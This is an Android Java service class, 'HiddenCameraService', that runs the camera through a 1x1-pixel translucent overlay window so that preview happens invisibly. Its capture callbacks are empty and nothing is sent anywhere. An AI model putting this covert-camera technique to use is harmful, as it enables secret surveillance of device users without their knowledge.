package euphoria.psycho.funny.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.view.ViewGroup;
import android.view.WindowManager;

import java.io.File;

import androidx.annotation.Nullable;
import euphoria.psycho.funny.hidden.CameraCallbacks;
import euphoria.psycho.funny.hidden.CameraPreview;

public class HiddenCameraService extends Service implements CameraCallbacks {
    private CameraPreview mCameraPreview;
    private WindowManager mWindowManager;

    private CameraPreview addPreview() {
        CameraPreview preview = new CameraPreview(this, this);
        preview.setLayoutParams(new ViewGroup
                .LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
        mWindowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                Build.VERSION.SDK_INT < Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY :
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT);
        mWindowManager.addView(preview, params);

        return preview;
    }

    private void stopCamera() {
        if (mCameraPreview != null) {
            mWindowManager.removeView(mCameraPreview);

        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startCamera() {
        if (mCameraPreview == null) {
            mCameraPreview = addPreview();
            mCameraPreview.startCamera();
        }

    }

    @Override
    public void onCameraError(int code) {

    }


    @Override
    public void onImageCapture(File image) {

    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        stopCamera();
    }
}
